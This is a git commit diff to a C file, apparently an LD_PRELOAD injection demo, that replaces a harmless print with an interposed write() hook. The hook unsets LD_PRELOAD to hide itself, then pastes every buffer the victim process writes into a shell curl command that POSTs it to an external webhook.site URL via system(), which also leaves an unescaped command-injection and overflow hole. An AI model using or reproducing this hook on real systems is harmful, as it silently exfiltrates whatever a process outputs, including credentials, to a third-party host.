8ebb0ae0b7639d90a571c6cd266ae75f889d74ac
nick <me@nickroy.org>
2021-04-04 14:35:18 -0400

    finished

--- example_6/inject.c
+++ example_6/inject.c
@@ -4,16 +4,28 @@
 #include <stdlib.h>
 #include <dlfcn.h>
 #include <unistd.h>
+#include <string.h>
+// note this can be re-written to use libcurl
 
 ssize_t write(int fd, const void *buf, size_t count) {
 
-  // get the buffer from memory address
+  // cast our buffer so we can read it
   char *p = (char *)buf;
-  printf("From memory address: %s\n", p);
+
+  // unset the ld_prload env
+  int ret = unsetenv("LD_PRELOAD");
+  
+  //format our string to make the curl call
+  char testData[50000];
+  strcpy(testData, "curl -s -d 'data=");
+  strcat(testData, p);
+  strcat(testData, "' -X POST 'https://webhook.site/65277f4e-f566-41bc-89ba-00132e05f7b3'");
+
+  //make our curl call
+  system(testData);
   
   // Look up the next write symbol
   ssize_t (*orig_write)(int fd, const void *buf, size_t count) = dlsym(RTLD_NEXT, "write");
-    
+
   return orig_write(fd, buf, count);
 }
-
